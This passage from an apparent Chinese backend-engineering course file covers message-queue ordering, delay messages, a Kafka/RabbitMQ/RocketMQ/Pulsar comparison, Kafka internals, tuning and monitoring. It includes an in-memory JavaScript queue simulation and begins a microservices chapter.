producer.send(topic, key=orderId, value=msg)

orderId=1001 的消息 → hash(1001) % 3 = 1 → 全进 Partition 1 → 有序
orderId=1002 的消息 → hash(1002) % 3 = 2 → 全进 Partition 2 → 有序
不同订单的消息在不同分区，可并行消费
\`\`\`

- 优点：兼顾顺序和并行。
- 缺点：同一 Key 的消息串行，热点 Key 可能积压。

**方案三：消费端按 Key 串行**

多个消费者分区并行拉取，但消费端按 Key 分组，同 Key 的消息在同一个线程串行处理：

\`\`\`
消费者拉到：[m1(key=A), m2(key=B), m3(key=A), m4(key=C)]
按 key 分组到不同线程：
  线程A: m1 → m3（串行，有序）
  线程B: m2
  线程C: m4
\`\`\`

#### 10.3 全局有序 vs 分区有序

| 语义 | 实现 | 吞吐 | 适用 |
|------|------|------|------|
| 全局有序 | 单分区单消费者 | 低 | 极少场景 |
| 分区有序 | Key 哈希路由 | 高 | 大多数场景 |

**生产建议**：99% 的场景用"分区有序"（Key 哈希路由）就够了。全局有序几乎不用，因为代价太大。

---

### 十一、延迟消息实现

**延迟消息**：消息发送后，不立即投递给消费者，而是延迟指定时间后投递。典型场景：订单 30 分钟未支付自动取消。

#### 11.1 各 MQ 的延迟消息支持

**Kafka：无原生支持**

Kafka 本身不支持延迟消息。常见变通方案：

- **多层 Topic**：创建多个延迟 Topic（delay-5s, delay-30s, delay-5m...），消息先投到对应延迟 Topic，定时器到点后转发到目标 Topic。
- **时间轮**：自定义时间轮算法（Kafka 内部用时间轮做延迟任务，但不暴露给用户）。

\`\`\`
多层 Topic 方案：
  原始消息 → delay-30m Topic → 30 分钟后定时器触发 → 转发到 orders-cancel Topic → 消费者消费
\`\`\`

**RabbitMQ：死信队列 + TTL**

\`\`\`
消息设 TTL → 到期未消费 → 进入死信队列(DLX) → 消费者监听 DLX

流程：
  消息 → normal-queue(TTL=30min, 无消费者)
       → 30 分钟后消息过期
       → DLX 路由到 delay-queue
       → 消费者从 delay-queue 消费
\`\`\`

问题：RabbitMQ 的 TTL 是"队头过期"——只有队头的消息过期了，后面的才会被检查。如果队头消息 TTL 长，后面的短 TTL 消息会被阻塞。

**RocketMQ：延迟等级（原生支持）**

\`\`\`
RocketMQ 支持固定延迟等级：
  1s 5s 10s 30s 1m 2m 3m 4m 5m 6m 7m 8m 9m 10m 20m 30m 1h 2h（18 个等级）

producer.send(msg, delayLevel=3)  // 延迟 10 秒
\`\`\`

RocketMQ 5.x 支持任意时间延迟（Timer Wheel 机制）。

**Pulsar：原生支持任意延迟**

\`\`\`
producer.newMessage()
    .value(msg)
    .deliverAfter(30, TimeUnit.MINUTES)  // 任意延迟
    .send();
\`\`\`

#### 11.2 延迟消息对比

| MQ | 延迟支持 | 精度 | 实现 |
|----|---------|------|------|
| Kafka | 无原生 | - | 多层 Topic 变通 |
| RabbitMQ | TTL+DLX | 秒级 | 队头阻塞问题 |
| RocketMQ | 固定等级/任意 | 秒级 | 原生支持 |
| Pulsar | 任意延迟 | 毫秒级 | 原生支持 |

---

### 十二、主流 MQ 全面对比

#### 12.1 Kafka vs RabbitMQ vs RocketMQ vs Pulsar

| 维度 | Kafka | RabbitMQ | RocketMQ | Pulsar |
|------|-------|----------|----------|--------|
| **模型** | Topic-Partition | Exchange-Queue | Topic-Queue | Topic-Partition（计算存储分离） |
| **吞吐** | 极高（百万/s） | 中（万级/s） | 高（十万/s） | 极高 |
| **延迟** | 几 ms | 微秒级 | 几 ms | 几 ms |
| **顺序性** | 分区有序 | 队列有序 | 分区有序 | 分区有序 |
| **可靠性** | 高（副本） | 高（持久化） | 高（同步刷盘） | 高（BookKeeper） |
| **延迟消息** | 无原生 | TTL+DLX | 原生支持 | 原生支持 |
| **事务** | 0.11+支持 | 不支持 | 支持 | 支持 |
| **协议** | 自定义 | AMQP/MQTT/STOMP | 自定义 | 自定义+Kafka协议 |
| **生态** | 大数据生态强 | 企业级强 | 阿里系 | 新兴 |
| **语言** | Scala/Java | Erlang | Java | Java |
| **运维** | 中等 | 简单 | 中等 | 复杂（依赖 BookKeeper） |

#### 12.2 选型决策

**选 Kafka**：

- 超高吞吐场景（日志收集、大数据流处理）。
- 需要消息回溯（按 offset 重新消费）。
- 团队有 Kafka 运维经验。

**选 RabbitMQ**：

- 复杂路由需求（多种 Exchange 类型）。
- 低延迟、小规模消息。
- 企业级 Java 应用（Spring 集成好）。
- 消息量不大（万级 QPS 以内）。

**选 RocketMQ**：

- 需要延迟消息、事务消息。
- 国内电商场景（阿里验证过）。
- 需要消息轨迹查询。

**选 Pulsar**：

- 计算存储分离架构（扩容灵活）。
- 多租户需求强。
- 需要 Kafka 协议兼容 + 更多功能。

#### 12.3 选型误区

- **不要为了"先进"选 Pulsar**：Pulsar 运维复杂，团队没经验容易踩坑。
- **不要为了"高吞吐"全上 Kafka**：万级 QPS 用 RabbitMQ 更简单。
- **不要忽视团队经验**：运维能力比技术先进性更重要。
- **不要忽视生态**：Kafka 的大数据生态（Flink/Spark/Connect）是巨大优势。

---

### 十三、实战要点与常见坑

#### 13.1 消息丢失排查 Checklist

\`\`\`
[ ] 生产端：acks 配置是否为 all？
[ ] 生产端：失败是否重试？重试次数够不够？
[ ] Broker：副本数是否 ≥ 2？min.insync.replicas 是否 ≥ 2？
[ ] Broker：持久化是否开启？
[ ] 消费端：是否手动 ack？处理完才提交？
[ ] 消费端：处理失败是否进死信队列而非丢弃？
\`\`\`

#### 13.2 消息重复排查 Checklist

\`\`\`
[ ] 消费端是否幂等？（去重表/业务状态/Redis）
[ ] 生产端是否启用幂等（Kafka idempotence=true）？
[ ] offset 提交是否在处理之后？
\`\`\`

#### 13.3 常见坑

**坑1：消费端慢导致积压**

原因：消费逻辑里有慢 SQL、外部 HTTP 调用超时。
解决：消费逻辑要快，慢操作异步化；设置单条消息处理超时。

**坑2：Rebalance 导致重复消费**

原因：Kafka Consumer Group rebalance 时，未提交的 offset 会被重新消费。
解决：rebalance 前提交 offset（ConsumerRebalanceListener）。

**坑3：消息体过大**

原因：把大文件/大 JSON 塞进消息体。
解决：消息体只放引用（如文件 URL），大数据走对象存储。

**坑4：分区数不合理**

原因：分区太少（消费者空闲）、太多（元数据开销）。
解决：按吞吐量规划，单 Broker 不超 4000 分区。

**坑5：忽略死信队列**

原因：处理失败的消息直接丢弃或无限重试。
解决：失败消息进死信队列，人工介入处理。

---

### 十四、生产案例

#### 案例1：电商订单事件驱动架构

\`\`\`
订单服务创建订单 → 投递"order.created"消息到 Kafka
  ↓
Consumer Group "inventory" → 扣减库存
Consumer Group "points" → 增加积分
Consumer Group "logistics" → 生成运单
Consumer Group "notification" → 发短信通知
Consumer Group "risk" → 风控检测

每个 Group 独立消费，互不影响
订单服务只管发消息，不关心谁消费
\`\`\`

要点：用 orderId 作为 Key 保证同一订单事件顺序；各消费组幂等消费；死信队列兜底。

#### 案例2：日志收集平台

\`\`\`
各应用 → Filebeat 采集日志 → Kafka（高吞吐暂存）
                                    ↓
                              Logstash/Spark 消费 → Elasticsearch
                                    ↓
                              Kibana 查询展示

Kafka 在这里做"削峰"：日志洪峰来时先堆 Kafka，ES 按能力消费
\`\`\`

要点：Kafka 高吞吐扛住日志洪峰；多分区并行消费；日志可丢（At-Most-Once 即可）。

#### 案例3：支付结果异步通知

\`\`\`
支付网关 → 支付完成 → 投递"payment.success"到 RocketMQ（延迟消息+事务消息）
  ↓
订单服务消费 → 更新订单状态为已支付
  ↓ 30 分钟未支付
订单服务消费延迟消息 → 检查未支付 → 自动取消订单
\`\`\`

要点：用 RocketMQ 延迟消息实现"30 分钟自动取消"；事务消息保证"支付成功"与"消息发送"原子性。

---

### 十五、本章小结

消息队列是分布式系统的"神经系统"，承担着异步化、解耦、削峰三大职责。核心知识回顾：

1. **三大作用**：异步化提升响应、解耦降低耦合、削峰保护下游。
2. **两种模型**：P2P（竞争消费）和 Pub/Sub（广播消费），Kafka 用 Consumer Group 统一两者。
3. **Kafka 架构**：Topic-Partition-Replica，分区是并行单元，副本是高可用单元。
4. **Kafka 高性能**：顺序写 + PageCache + 零拷贝 + 批量压缩 + 分区并行。
5. **投递语义**：At-Most-Once / At-Least-Once（默认）/ Exactly-Once（事务）。
6. **可靠性三道防线**：生产确认 + Broker 持久化 + 消费手动 ack。
7. **幂等消费**：业务状态/去重表/Redis 去重，让重复消费无害化。
8. **顺序性**：分区有序（Key 哈希路由）是生产首选。
9. **延迟消息**：Kafka 无原生，RabbitMQ 用 TTL+DLX，RocketMQ/Pulsar 原生支持。
10. **选型**：Kafka 重吞吐、RabbitMQ 重路由、RocketMQ 重功能、Pulsar 重架构。

## 十一、Kafka 存储引擎深度剖析

### 11.1 日志段（Log Segment）结构

Kafka 每个分区在磁盘上是一个目录，包含多个日志段文件。每个段以起始偏移量命名，当段大小达到 log.segment.bytes（默认 1GB）或时间达到 log.roll.hours（默认 168h）时滚动创建新段。

每个日志段由三个文件组成：
- .log 文件：消息数据，消息按顺序追加写入
- .index 文件：偏移量稀疏索引，每写入 4KB 记录一条
- .timeindex 文件：时间戳索引，支持按时间戳查找

### 11.2 写入路径

1. 生产者发送消息到 Leader 副本
2. Leader 追加到当前活跃段的 .log 文件末尾
3. 顺序写磁盘，数据先写入 PageCache，由 OS 异步刷盘
4. 根据 acks 配置等待 Follower 同步
5. 更新 LEO（Log End Offset）和 HW（High Watermark）
6. 返回响应给生产者

顺序写性能远超随机写：7200rpm HDD 顺序写可达 600MB/s，随机写仅 100KB/s。这是因为顺序写避免了磁盘寻道开销。SSD 虽然没有机械寻道，但顺序写仍然优于随机写，因为可以减少写放大并有利于闪存转换层（FTL）的块合并。

### 11.3 读取路径与零拷贝

1. 消费者指定偏移量发起 Fetch 请求
2. Broker 二分查找定位日志段
3. 在 .index 中二分查找最近索引项
4. 从 .log 对应位置扫描找到目标消息
5. 通过 sendfile 零拷贝直接将数据从 PageCache 送到网卡

零拷贝对比：
- 传统方式：磁盘 → PageCache → 用户空间 → Socket Buffer → 网卡（4次拷贝 + 4次上下文切换）
- sendfile：磁盘 → PageCache → 网卡（2次拷贝 + 2次上下文切换）

Java 层面，FileChannel.transferTo() 底层调用 Linux sendfile 系统调用。这是 Kafka 高吞吐的关键技术之一。

### 11.4 日志保留与压缩

| 策略 | 参数 | 说明 |
|------|------|------|
| 基于时间 | log.retention.hours | 默认 168h，超时删除旧段 |
| 基于大小 | log.retention.bytes | 默认 -1（不限） |
| 日志压缩 | log.cleanup.policy=compact | 保留每个 Key 的最新值 |

日志压缩不同于删除：压缩后的日志仍可按 Key 查询最新状态，适合存储用户信息变更、配置变更等状态流。压缩在后台线程执行，不影响正常读写。

### 11.5 副本同步机制

- LEO（Log End Offset）：每个副本的下一条写入位置
- HW（High Watermark）：所有 ISR 副本中最小的 LEO，消费者只能看到 HW 之前的消息
- ISR（In-Sync Replicas）：与 Leader 保持同步的副本集合

Follower 主动拉取 Leader 的数据，落后太多（超过 replica.lag.time.max.ms，默认 10s）会被踢出 ISR。Leader 故障时，从 ISR 中选举新 Leader，保证不丢已提交消息。

### 11.6 Leader 选举

Controller 负责分区 Leader 选举：
1. 检测到 Leader 所在 Broker 宕机
2. 从 ISR 中选择第一个存活的副本作为新 Leader
3. 如果 ISR 为空，可根据 unclean.leader.election.enable 决定是否从非 ISR 副本中选
4. 通知所有 Broker 更新元数据

unclean.leader.election.enable=true 时，可能选举数据落后的副本，导致数据丢失但保证可用性。设为 false 则等待 ISR 副本恢复，保证数据一致但牺牲可用性。

## 十二、消息积压诊断与处理

### 12.1 积压原因诊断

| 现象 | 可能原因 | 诊断方法 |
|------|---------|---------|
| 消费速度持续下降 | 消费逻辑变慢 | 查看消费耗时、依赖延迟 |
| 突然停止消费 | 消费者崩溃/Rebalance 卡住 | 查看消费者日志、线程栈 |
| 生产速度突增 | 上游流量突增 | 查看生产者速率 |
| 分区不均 | Key 路由倾斜 | 查看各分区积压量 |

### 12.2 紧急处理方案

方案一：扩消费者。增加消费者实例数（不超过分区数）。消费者数超过分区数时，多余消费者空闲。

方案二：临时消费者转储。新开一个消费者组，快速消费消息转储到 DB 或 ES，稍后再处理。关键是不做业务处理，只存消息。

方案三：跳过积压。重置消费位点到 latest。会丢失数据，仅适用于可丢弃场景。

### 12.3 长期优化方案

1. 优化消费逻辑：批量处理、异步化、减少 IO
2. 合理分区数：目标吞吐 / 单分区吞吐 = 分区数
3. 监控告警：积压量超阈值时告警
4. 自动伸缩：基于积压量自动扩缩消费者

### 12.4 消费者 Rebalance 优化

Rebalance 导致消费者短暂停止消费，频繁 Rebalance 影响吞吐。

优化策略：
- 增大 session.timeout.ms，避免误判消费者下线
- 增大 max.poll.interval.ms，避免消费慢被踢出
- 使用 StickyAssignor 粘性分配，减少分区变动
- 使用 CooperativeRebalance 增量式重平衡，不停消费

## 十三、消息队列监控体系

### 13.1 核心指标

Broker 侧：
- UnderReplicatedPartitions：未同步副本数（>0 告警）
- ISRShrinksPerSec：ISR 收缩速率
- ActiveControllerCount：应为 1
- BytesInPerSec / BytesOutPerSec：吞吐量
- DiskUsage：磁盘使用率

消费者侧：
- records-lag-max：最大积压量（关键告警）
- records-consumed-rate：消费速率
- rebalance-rate：重平衡频率

### 13.2 告警规则

| 指标 | 阈值 | 级别 |
|------|------|------|
| UnderReplicatedPartitions | > 0 | P1 |
| records-lag-max | > 100000 | P2 |
| DiskUsage | > 85% | P1 |
| ActiveControllerCount | ≠ 1 | P0 |
| rebalance-rate | > 5/min | P3 |

### 13.3 工具链

- Kafka Manager / Cruise Control：集群管理、负载均衡
- Burrow：消费延迟监控（LinkedIn 开源）
- Prometheus + Grafana：JMX 指标采集与可视化
- ELK / Loki：日志聚合
- Jaeger / Zipkin：链路追踪

## 十四、多语言客户端对比

### 14.1 客户端选型

| 语言 | 推荐库 | 特点 |
|------|--------|------|
| Java | kafka-clients（官方） | 功能最全，性能最优 |
| Go | sarama | 纯 Go，无外部依赖 |
| Go | confluent-kafka-go | 封装 librdkafka，性能更好 |
| Python | kafka-python | 纯 Python，易用 |
| Python | confluent-kafka-python | 封装 librdkafka |
| Node.js | kafkajs | 纯 JS，无原生依赖 |
| Rust | rdkafka | 高性能 |

### 14.2 多语言生产者对比

Java 使用 KafkaProducer 类，配置 bootstrap.servers 和 acks，通过 send() 异步发送，支持回调。Go 使用 sarama 的 NewSyncProducer，配置 RequiredAcks，通过 SendMessage 发送。Python 使用 KafkaProducer，通过 value_serializer 指定序列化，send() 返回 Future。Node.js 使用 kafkajs 的 producer()，connect() 后 send() 发送，API 异步友好。

### 14.3 客户端最佳实践

1. 生产者：启用幂等（enable.idempotence=true）+ 重试
2. 合理设置 acks（all=最高可靠，1=默认，0=最高吞吐）
3. 消费者：手动提交 offset，处理完再提交
4. 批量处理消息，减少 DB/网络往返
5. 合理设置 max.poll.records，平衡延迟和吞吐
6. 监控：客户端指标导出，接入 Prometheus

## 十五、消息队列性能调优

### 15.1 生产者调优

1. **批量发送**：linger.ms + batch.size，积攒消息批量发送，提升吞吐
2. **压缩**：compression.type=lz4/zstd，减少网络和存储开销
3. **异步发送**：send() 不等待响应，回调处理结果
4. **缓冲区**：buffer.memory 调大，避免生产者阻塞
5. **幂等+重试**：enable.idempotence=true + retries=Integer.MAX_VALUE

调优参数示例：
- linger.ms=10（等待 10ms 积攒批量）
- batch.size=65536（64KB 批次大小）
- compression.type=zstd（最高压缩率）
- buffer.memory=67108864（64MB 缓冲区）
- max.in.flight.requests.per.connection=5（幂等时安全）

### 15.2 消费者调优

1. **批量拉取**：max.poll.records 调大，减少轮询次数
2. **预取**：fetch.min.bytes/fetch.max.bytes 控制拉取量
3. **并发处理**：多线程处理消息（注意 offset 提交顺序）
4. **手动提交**：enable.auto.commit=false，处理完手动提交
5. **分区数**：消费者数 = 分区数，最大化并行

### 15.3 Broker 调优

1. **磁盘**：使用 SSD，多磁盘 RAID 10
2. **网络**：万兆网卡，socket send/recv buffer 调大
3. **JVM**：堆内存 6-8GB，使用 G1 GC
4. **OS**：vm.swappiness=1，减少 swap；文件描述符调大
5. **分区数**：单 Broker 分区数建议 < 4000
6. **副本数**：replication.factor=3，min.insync.replicas=2

### 15.4 性能基准

| 配置 | 吞吐 | 延迟 |
|------|------|------|
| acks=0, 无压缩 | 最高（~200MB/s） | 最低 |
| acks=1, lz4 | 高（~150MB/s） | 低 |
| acks=all, zstd | 中（~100MB/s） | 中 |
| acks=all, 无批量 | 低（~20MB/s） | 高 |

### 15.5 常见性能问题

1. 生产者延迟高：检查 linger.ms、网络、Broker 负载
2. 消费者积压：检查消费逻辑、分区数、消费者数
3. Broker CPU 高：检查分区数、GC、网络线程
4. 磁盘 IO 高：检查段滚动、日志压缩、磁盘性能
5. 网络带宽满：检查副本流量、消费者拉取频率

## 十六、消息顺序性保证

### 16.1 全局有序 vs 分区有序

全局有序：整个 Topic 所有消息严格有序。只能用单分区，牺牲并行度。
分区有序：同一 Key 的消息发到同一分区，分区内有序。推荐方案。

### 16.2 分区有序实现

1. 生产者指定 Key（如 orderId）
2. Kafka 按 Key 哈希路由到固定分区
3. 同一 Key 的消息在分区内有序
4. 消费者单线程消费每个分区

### 16.3 顺序消费的挑战

1. 消费失败重试不能跳过（会破坏顺序）
2. 消费慢会阻塞后续消息
3. 扩分区后 Key 路由可能变化
4. 消费者 Rebalance 时短暂无序

### 16.4 顺序消费方案

方案一：单分区 + 单消费者
- 最简单，严格有序
- 吞吐低，无法扩展

方案二：多分区 + Key 路由
- 同一 Key 有序
- 吞吐高，可扩展
- 不同 Key 之间无序

方案三：多分区 + Key 路由 + 顺序消费框架
- 消费者拉取后按 Key 分发到不同线程
- 每个线程串行消费同一 Key 的消息
- 需要处理失败重试和位移提交

## 十七、延迟消息实现

### 17.1 延迟消息场景

- 订单 30 分钟未支付自动取消
- 预约提醒提前 1 小时通知
- 退款 3 个工作日后查询结果

### 17.2 各 MQ 延迟消息支持

| MQ | 延迟消息 | 方案 |
|----|---------|------|
| Kafka | 不支持 | 需自行实现 |
| RabbitMQ | 有限支持 | TTL + DLX（死信交换机） |
| RocketMQ | 原生支持 | 18 个延迟级别 |
| Pulsar | 原生支持 | 任意延迟时间 |

### 17.3 Kafka 延迟消息实现方案

方案一：定时轮询
- 消息存储时附带到期时间
- 定时任务扫描到期消息
- 简单但效率低

方案二：多级延迟 Topic
- 创建多个延迟级别的 Topic（delay-5s, delay-30s, delay-1m...）
- 消息写入对应延迟 Topic
- 消费者等到到期时间才消费
- 缺点：延迟级别固定

方案三：时间轮（Timing Wheel）
- 类似 Netty 的 HashedWheelTimer
- 消息按到期时间放入时间轮
- 时间轮转动到对应槽位时触发
- 高效，支持任意延迟

### 17.4 RabbitMQ 延迟消息

利用 TTL + DLX：
1. 消息发送到延迟队列，设置 TTL
2. 消息过期后进入死信交换机
3. 死信交换机路由到目标队列
4. 消费者从目标队列消费

延迟插件（rabbitmq_delayed_message_exchange）更方便：
- 安装插件后创建 x-delayed-message 类型的 Exchange
- 发送时指定 x-delay 头部（毫秒）
- 插件负责到期投递

## 十八、消息轨迹与可观测性

### 18.1 消息轨迹

记录消息从生产到消费的完整链路：
- 生产者：发送时间、Topic、Key、消息 ID
- Broker：存储分区、Offset、存储时间
- 消费者：消费时间、消费耗时、消费结果

用途：排查消息丢失、消费延迟、重复消费等问题。

### 18.2 链路追踪集成

在消息中注入 Trace ID：
1. 生产者生成 Trace ID，放入消息 Header
2. Broker 传递 Trace ID
3. 消费者从 Header 提取 Trace ID
4. 消费者的后续调用继承 Trace ID

这样可以将消息消费链路串联到分布式追踪系统（Jaeger/Zipkin/SkyWalking）。

### 18.3 多语言 Trace 注入对比

Java：使用 OpenTelemetry SDK 自动注入
Go：使用 otelgo 手动注入 Header
Python：使用 opentelemetry-python 注入
Node.js：使用 @opentelemetry/api 注入

---

> 下一章我们将进入微服务架构，看看消息队列如何在服务间解耦中发挥作用。`,
    code: `// ============================================================
// 消息队列 —— 内存模拟实现
// 实现 Topic+Partition、生产者路由、消费者组负载均衡、
// offset 管理、ack 机制、死信队列、顺序消息、重复消费演示
// ============================================================

const crypto = require('crypto');

// ---------- 消息队列核心 ----------
class MessageQueue {
  constructor() {
    this.topics = new Map(); // topicName -> Topic
  }

  // 创建 Topic（指定分区数）
  createTopic(name, partitions = 3) {
    const topic = {
      name,
      partitions: Array.from({ length: partitions }, (_, i) => ({
        id: i,
        messages: [],          // 消息列表（模拟持久化）
        offsets: new Map(),    // consumerGroup -> 已提交 offset
      })),
    };
    this.topics.set(name, topic);
    console.log(\`[MQ] 创建 Topic: \${name} (\${partitions} 个分区)\`);
    return topic;
  }

  // 生产者发送消息
  produce(topicName, { key, value, partition }) {
    const topic = this.topics.get(topicName);
    if (!topic) throw new Error(\`Topic \${topicName} 不存在\`);

    // 决定分区
    let pId;
    if (partition !== undefined) {
      pId = partition;                          // 指定分区
    } else if (key !== undefined) {
      pId = this.hash(key) % topic.partitions.length; // key 哈希路由（保证同 key 同分区）
    } else {
      pId = Math.floor(Math.random() * topic.partitions.length); // 随机
    }

    const msg = {
      offset: topic.partitions[pId].messages.length, // 分区内 offset
      key, value, partition: pId,
      timestamp: Date.now(),
      msgId: crypto.randomUUID(),
    };
    topic.partitions[pId].messages.push(msg);
    return msg;
  }

  // 简单哈希函数
  hash(str) {
    let h = 0;
    for (let i = 0; i < str.length; i++) {
      h = ((h << 5) - h + str.charCodeAt(i)) | 0;
    }
    return Math.abs(h);
  }

  // 消费者组拉取消息
  consume(topicName, consumerGroup, partition, batchSize = 10) {
    const topic = this.topics.get(topicName);
    const p = topic.partitions[partition];
    const committed = p.offsets.get(consumerGroup) || 0;
    const messages = p.messages.slice(committed, committed + batchSize);
    return messages;
  }

  // 提交 offset
  commit(topicName, consumerGroup, partition, offset) {
    const topic = this.topics.get(topicName);
    topic.partitions[partition].offsets.set(consumerGroup, offset);
  }
}

// ---------- 消费者组（含负载均衡 + ack + 死信） ----------
class ConsumerGroup {
  constructor(mq, topicName, groupName, handler) {
    this.mq = mq;
    this.topicName = topicName;
    this.groupName = groupName;
    this.handler = handler;          // 消息处理函数
    this.deadLetters = [];           // 死信队列
    this.assignedPartitions = new Map(); // consumerId -> [partitionIds]
    this.consumed = 0;               // 已消费数（统计）
  }

  // 分区分配（轮询分配给消费者）
  assignConsumers(consumerIds) {
    const topic = this.mq.topics.get(this.topicName);
    const partitions = topic.partitions.map(p => p.id);
    this.assignedPartitions.clear();
    consumerIds.forEach(id => this.assignedPartitions.set(id, []));
    partitions.forEach((p, i) => {
      const consumerId = consumerIds[i % consumerIds.length];
      this.assignedPartitions.get(consumerId).push(p);
    });
    console.log(\`[ConsumerGroup \${this.groupName}] 分区分配: \${JSON.stringify([...this.assignedPartitions.entries()])}\`);
  }

  // 消费者拉取并处理（手动 ack 模式）
  poll(consumerId) {
    const partitions = this.assignedPartitions.get(consumerId) || [];
    for (const pId of partitions) {
      const messages = this.mq.consume(this.topicName, this.groupName, pId, 5);
      for (const msg of messages) {
        try {
          this.handler(msg);                    // 处理消息
          this.mq.commit(this.topicName, this.groupName, pId, msg.offset + 1); // 手动 ack
          this.consumed++;
        } catch (e) {
          console.log(\`  [死信] 消息处理失败 msgId=\${msg.msgId} 错误: \${e.message}\`);
          this.deadLetters.push({ ...msg, error: e.message }); // 进死信队列
          this.mq.commit(this.topicName, this.groupName, pId, msg.offset + 1); // 跳过
        }
      }
    }
  }
}

// ============================================================
// 演示场景
// ============================================================

const mq = new MessageQueue();
mq.createTopic('orders', 3);

// ---------- 场景1：发布订阅（不同消费者组各自消费全量） ----------
console.log('\\n=== 场景1: 发布订阅（多消费者组独立消费） ===');

// 消费者组 A：库存服务
const inventoryGroup = new ConsumerGroup(mq, 'orders', 'inventory', (msg) => {
  console.log(\`  [库存组] 消费: \${msg.value} (partition=\${msg.partition}, offset=\${msg.offset})\`);
});

// 消费者组 B：积分服务
const pointsGroup = new ConsumerGroup(mq, 'orders', 'points', (msg) => {
  console.log(\`  [积分组] 消费: \${msg.value} (partition=\${msg.partition}, offset=\${msg.offset})\`);
});

// 生产 3 条消息（无 key，随机分区）
mq.produce('orders', { value: '订单-1001-创建' });
mq.produce('orders', { value: '订单-1002-创建' });
mq.produce('orders', { value: '订单-1003-创建' });

inventoryGroup.assignConsumers(['inv-1']);
pointsGroup.assignConsumers(['pts-1']);
console.log('库存组消费:');
inventoryGroup.poll('inv-1');
console.log('积分组消费:');
pointsGroup.poll('pts-1');

// ---------- 场景2：消费者组负载均衡 ----------
console.log('\\n=== 场景2: 消费者组负载均衡（3 分区 2 消费者） ===');

const orderGroup = new ConsumerGroup(mq, 'orders', 'order-process', (msg) => {
  console.log(\`  [订单处理] 消费: \${msg.value}\`);
});
orderGroup.assignConsumers(['worker-1', 'worker-2']); // 2 个消费者分 3 个分区
console.log('worker-1 消费:');
orderGroup.poll('worker-1');
console.log('worker-2 消费:');
orderGroup.poll('worker-2');

// ---------- 场景3：顺序消息（Key 哈希路由） ----------
console.log('\\n=== 场景3: 顺序消息（同 orderId 同分区，保证顺序） ===');

mq.createTopic('order-events', 3);
const seqGroup = new ConsumerGroup(mq, 'order-events', 'seq', (msg) => {
  console.log(\`  消费: \${msg.value} (key=\${msg.key}, partition=\${msg.partition})\`);
});
seqGroup.assignConsumers(['seq-1']);

// 同一订单的 3 个事件，用 orderId 做 key，进同一分区保证顺序
const orderId = 'ORD-2001';
mq.produce('order-events', { key: orderId, value: '创建订单' });
mq.produce('order-events', { key: orderId, value: '支付完成' });
mq.produce('order-events', { key: orderId, value: '发货' });

console.log('按顺序消费同一订单事件:');
seqGroup.poll('seq-1');

// ---------- 场景4：at-least-once 重复消费 ----------
console.log('\\n=== 场景4: at-least-once 重复消费（处理成功但未提交 offset） ===');

mq.createTopic('payments', 1);
let processCount = 0;
const failGroup = new ConsumerGroup(mq, 'payments', 'pay', (msg) => {
  processCount++;
  console.log(\`  第 \${processCount} 次处理: \${msg.value}\`);
});
failGroup.assignConsumers(['pay-1']);

mq.produce('payments', { value: '支付-PAY-001' });

// 第一次消费（模拟处理完但崩溃，未提交 offset）
const topic = mq.topics.get('payments');
console.log('第一次消费（处理完未提交 offset，模拟崩溃）:');
const msgs1 = mq.consume('payments', 'pay', 0, 1);
msgs1.forEach(m => failGroup.handler(m)); // 处理了但没 commit

console.log('第二次消费（offset 未变，重复消费）:');
failGroup.poll('pay-1'); // 这次 poll 才 commit

// ---------- 场景5：消费失败 → 死信队列 ----------
console.log('\\n=== 场景5: 消费失败进死信队列 ===');

mq.createTopic('tasks', 1);
let callCount = 0;
const taskGroup = new ConsumerGroup(mq, 'tasks', 'task', (msg) => {
  callCount++;
  if (callCount === 2) throw new Error('处理超时'); // 第二条消息模拟失败
  console.log(\`  处理成功: \${msg.value}\`);
});
taskGroup.assignConsumers(['task-1']);

mq.produce('tasks', { value: '任务-1' });
mq.produce('tasks', { value: '任务-2(会失败)' });
mq.produce('tasks', { value: '任务-3' });

taskGroup.poll('task-1');
console.log(\`死信队列: \${taskGroup.deadLetters.length} 条\`);
console.log(\`  死信内容: \${taskGroup.deadLetters.map(d => d.value).join(', ')}\`);

console.log('\\n=== 全部演示完成 ===');
`,
  },

  // =========================================================
  // 第二章：微服务架构
  // =========================================================
  {
    id: "backend-microservice",
    group: "分布式与工程化",
    icon: "🏗",
    title: "微服务架构",
    content: `## 微服务架构

**微服务架构（Microservices）** 是一种将单体应用拆分为一组小型、独立、围绕业务能力组织的服务架构风格。每个服务独立部署、独立扩展、拥有独立数据库，服务间通过轻量协议（HTTP/gRPC/MQ）通信。微服务不是银弹——它解决了单体架构的痛点，但也带来了分布式系统的复杂性。

本章从单体痛点出发，逐层拆解微服务拆分、服务通信、注册发现、负载均衡、API 网关、配置中心、链路追踪、服务网格，最后客观分析微服务的优劣与适用场景。

### 一、从单体到微服务的演进

#### 1.1 单体架构的痛点

**单体架构**：所有功能模块打包在一个应用里，部署为一个进程。

\`\`\`
单体电商应用（一个 WAR/JAR）
├── 用户模块（登录、注册、个人中心）
├── 商品模块（搜索、详情、类目）
├── 订单模块（下单、查询、取消）
├── 支付模块（支付、退款）
├── 库存模块（扣减、补充）
├── 物流模块（发货、查询）
└── 一个数据库（所有表在一起）
\`\`\`

**痛点1：代码膨胀，协作困难**

随着业务增长，代码量从 10 万行膨胀到 100 万行。几十人同时改一个代码库：

- 提交冲突频繁（改同一文件）。
- 互相影响（A 改的代码导致 B 的功能出错）。
- 新人上手难（理解整个代码库需要几个月）。
- 编译慢（改一行代码，编译 5 分钟）。

**痛点2：部署耦合**

任何一个模块的小改动（如商品列表加个字段），都要重新打包整个应用、全量重启：

- 部署风险高：改了商品模块，重启时整个系统不可用。
- 无法局部更新：只想扩容订单模块（大促期间），但只能整体扩容。
- 发布慢：一个应用部署要 10 分钟，期间全站受影响。

**痛点3：技术栈单一**

单体只能用一种语言/框架（如 Java+Spring）。想做 AI 推荐要用 Python？想用 Go 写高性能网关？在单体里做不到——所有模块被迫用同一种技术。

**痛点4：扩展受限**

单体的扩展是"整体扩展"——即使只有订单模块需要扩容（大促），也只能把整个应用复制多份。商品、用户等不需要扩容的模块也被复制，浪费资源。

**痛点5：故障扩散**

一个模块的 bug（如内存泄漏）会导致整个应用崩溃，所有模块都不可用。一个模块的 OOM 让全站宕机。

#### 1.2 微服务的驱动力

微服务正是为解决上述痛点而生：

| 单体痛点 | 微服务解法 |
|---------|-----------|
| 代码膨胀协作难 | 按业务拆分，团队各管一摊 |
| 部署耦合 | 独立部署，互不影响 |
| 技术栈单一 | 每个服务自选技术 |
| 扩展受限 | 按需扩展单个服务 |
| 故障扩散 | 故障隔离在单个服务 |

**核心思想**：把大而全的单体，拆成小而专的服务，每个服务"独立开发、独立部署、独立扩展、独立数据库"。

#### 1.3 微服务的定义

